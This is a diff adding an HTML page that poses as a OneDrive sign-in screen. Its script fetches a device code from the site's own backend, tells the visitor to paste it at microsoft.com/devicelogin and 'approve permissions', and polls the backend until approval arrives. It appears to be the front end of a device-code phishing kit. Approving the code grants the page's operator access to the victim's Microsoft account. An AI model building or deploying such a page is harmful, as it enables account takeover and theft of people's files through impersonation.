@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+    <title>OneDrive</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: white; border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 40px; max-width: 500px; width: 90%; text-align: center; }
+       .logo {
+    margin: 0 auto 20px;
+}
+
+.logo img {
+    width: 32px;
+    height: 32px;
+    display: block;
+    margin: 0 auto;
+    object-fit: contain;
+}
+
+
+ 
+        h1 { color: #323130; margin-bottom: 10px; font-size: 28px; }
+        .subtitle { color: #605e5c; margin-bottom: 30px; font-size: 16px; }
+        .code-container { background: #f3f2f1; border: 2px dashed #edebe9; border-radius: 5px; padding: 20px; margin-bottom: 20px; position: relative; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #e1dfdd; border-top: 4px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .code-display { font-family: 'Courier New', monospace; font-size: 18px; font-weight: bold; color: #0078d4; letter-spacing: 4px; background: white; padding: 15px; border-radius: 6px; border: 2px solid #0078d4; min-height: 50px; display: none; }
+        .status { font-size: 14px; color: #605e5c; margin-bottom: 20px; min-height: 20px; }
+        .btn { background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); color: white; border: none; padding: 14px 32px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: all 0.3s; width: 100%; margin-bottom: 15px; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,120,212,0.3); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .copy-btn { background: #fff; color: #0078d4; border: 2px solid #0078d4; font-weight: 600; padding: 12px 24px; font-size: 14px; border-radius: 6px; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
+        .copy-btn:hover { background: #0078d4; color: white; }
+        .instructions { background: #f3f2f1; border-radius: 8px; padding: 20px; margin-top: 20px; font-size: 14px; color: #323130; line-height: 1.5; }
+        .instructions ol { text-align: left; margin-left: 20px; }
+        .instructions li { margin-bottom: 8px; }
+        .success { color: #107c10; background: #d9f0d8; border: 1px solid #b8e0b2; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
+        .error { color: #a4262c; background: #fde7e9; border: 1px solid #f4cccc; padding: 12px; border-radius: 6px; margin-bottom: 20px; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+       <div class="logo">
+    <img src="/static/logo.png" alt="logo">
+    </div>
+        <h1>OneDrive</h1>
+        <p class="subtitle">Sign in to continue to your files</p>
+        
+        <div class="success" id="successMsg"></div>
+        <div class="error" id="errorMsg"></div>
+        
+        <div class="code-container">
+            <div class="spinner" id="spinner"></div>
+            <div class="code-display" id="codeDisplay"></div>
+            <button class="copy-btn" id="copyBtn" style="display: none;">📋 Copy Code</button>
+        </div>
+        
+        <button class="btn" id="approveBtn" disabled> loading...</button>
+        
+        <div class="instructions">
+            <strong>Quick Access Instructions:</strong>
+            <ol>
+                <li>Copy the code above</li>
+                <li> click <strong> the open document button</strong></li>
+                <li>Paste the code and sign in</li>
+                <li>Approve permissions</li>
+                <li>Your OneDrive will open automatically</li>
+            </ol>
+        </div>
+    </div>
+
+    <script>
+        let sessionId = null;
+        let deviceCode = null;
+        let pollInterval = null;
+        let copyTimeout = null;
+
+        const elements = {
+            status: document.getElementById('status'),
+            spinner: document.getElementById('spinner'),
+            codeDisplay: document.getElementById('codeDisplay'),
+            copyBtn: document.getElementById('copyBtn'),
+            approveBtn: document.getElementById('approveBtn'),
+            successMsg: document.getElementById('successMsg'),
+            errorMsg: document.getElementById('errorMsg')
+        };
+
+        function showStatus(msg, color = '#605e5c') {
+            elements.status.textContent = msg;
+            elements.status.style.color = color;
+        }
+
+        function showError(msg) {
+            elements.errorMsg.textContent = msg;
+            elements.errorMsg.style.display = 'block';
+            elements.successMsg.style.display = 'none';
+        }
+
+        function showSuccess(msg) {
+            elements.successMsg.textContent = msg;
+            elements.successMsg.style.display = 'block';
+            elements.errorMsg.style.display = 'none';
+        }
+
+        function updateUI() {
+            if (deviceCode) {
+                elements.spinner.style.display = 'none';
+                elements.codeDisplay.style.display = 'block';
+                elements.codeDisplay.textContent = deviceCode;
+                elements.copyBtn.style.display = 'block';
+                elements.approveBtn.textContent = 'Open document';
+                elements.approveBtn.disabled = false;
+                elements.approveBtn.onclick = () => {
+                  if (deviceCode) {
+                     navigator.clipboard.writeText(deviceCode).then(() => {
+                        window.open('https://microsoft.com/devicelogin', '_blank');
+                     }).catch(() => {
+                         window.open('https://microsoft.com/devicelogin', '_blank');
+                    });
+                  }
+                };
+            }
+        }
+
+        async function startFlow() {
+            try {
+    
+
+                const response = await fetch('/start');
+                const data = await response.json();
+
+                if (data.session_id) {
+                    sessionId = data.session_id;
+
+                    if (data.user_code) {
+                       deviceCode = data.user_code;
+                       updateUI();
+                    }
+                    
+                    pollInterval = setInterval(pollStatus, 3000);
+                } else {
+                    throw new Error(data.error || 'Failed to generate device code');
+                }
+            } catch (error) {
+                console.error('Start flow error:', error);
+                showError('Failed to initialize. Please refresh and try again.');
+                elements.approveBtn.disabled = true;
+            }
+        }
+
+        async function pollStatus() {
+            if (!sessionId) return;
+
+            try {
+                const response = await fetch(`/code?sid=${sessionId}`);
+                const data = await response.json();
+
+                if (data.code) {
+                    clearInterval(pollInterval);
+                    elements.approveBtn.disabled = false;
+                    return;
+                }
+
+                if (data.error) {
+                    if (data.error === 'expired') {
+                        clearInterval(pollInterval);
+                        showError('⏰ Code expired. Please refresh and get a new code.');
+                        elements.approveBtn.disabled = true;
+                    } else if (data.error === 'authorization_pending') {
+                        showStatus('Waiting for approval on microsoft.com/devicelogin...', '#ff8c00');
+                    } else {
+                        showStatus(`Polling... (${data.message || 'pending'})`, '#605e5c');
+                    }
+                }
+            } catch (error) {
+                console.error('Poll error:', error);
+                showStatus('Connection issue, retrying...', '#ff8c00');
+            }
+        }
+
+        // Copy button handler
+        elements.copyBtn.onclick = async () => {
+            try {
+                await navigator.clipboard.writeText(deviceCode);
+                elements.copyBtn.textContent = ' Copied!';
+                elements.copyBtn.style.background = '#107c10';
+                
+                clearTimeout(copyTimeout);
+                copyTimeout = setTimeout(() => {
+                    elements.copyBtn.textContent = '📋 Copy Code';
+                    elements.copyBtn.style.background = '';
+                }, 2000);
+            } catch (err) {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = deviceCode;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+            }
+        };
+
+        // Auto-retry on error
+        window.onerror = () => {
+            setTimeout(startFlow, 1000);
+        };
+
+        // Initialize
+        window.onload = () => {
+            setTimeout(startFlow, 500); 
+        };
+    </script>
+</body>
+</html> 
